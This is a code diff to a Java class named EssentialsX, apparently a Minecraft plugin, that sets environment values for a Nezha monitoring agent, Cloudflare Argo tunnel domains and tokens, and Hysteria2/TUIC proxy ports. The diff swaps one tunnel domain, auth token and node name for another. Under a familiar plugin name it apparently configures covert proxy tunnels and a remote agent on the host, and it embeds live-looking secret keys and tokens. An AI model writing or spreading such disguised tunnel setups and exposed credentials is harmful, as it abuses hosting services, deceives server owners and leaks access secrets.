@@ -79,8 +79,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("NEZHA_PORT", "");
         env.put("NEZHA_KEY", "Mp37NLvLelmYFU9VKGaxYScjcGa1DcLY");
         env.put("ARGO_PORT", "8001");
-        env.put("ARGO_DOMAIN", "dracobyte.bbdd.pp.ua");
-        env.put("ARGO_AUTH", "eyJhIjoiNWZiZDU1M2IzNjViZWE3YWRlYjNmYzIyMjM4NGNlMzMiLCJ0IjoiYjMyODQxY2ItZDc3Yi00NjM2LTgzMDItYmJkMjc0MWI0OTdjIiwicyI6Ik0yRmlZMlE1TnpZdE16SXlaQzAwWXpKbExXSTFZelF0WkdaaU5HVTNZekE1T0RZdyJ9");
+        env.put("ARGO_DOMAIN", "bytenut_sg.bbdd.pp.ua");
+        env.put("ARGO_AUTH", "eyJhIjoiNWZiZDU1M2IzNjViZWE3YWRlYjNmYzIyMjM4NGNlMzMiLCJ0IjoiMmE0OTY1ZGQtYTE1ZS00NmU5LTlhMzAtOTRlMmJkOWVjODI2IiwicyI6Ik56VXpORGM0TkdNdE5UbGhaaTAwTkRBekxXSTVaV0l0TldSak1XTTJNR0UyTkRGbCJ9");
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "3980");
         env.put("TUIC_PORT", "");
@@ -92,7 +92,7 @@ public class EssentialsX extends JavaPlugin {
         env.put("BOT_TOKEN", "");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "dracobyte");
+        env.put("NAME", "bytenut");
         env.put("DISABLE_ARGO", "false");
         
         // Load from system environment variables
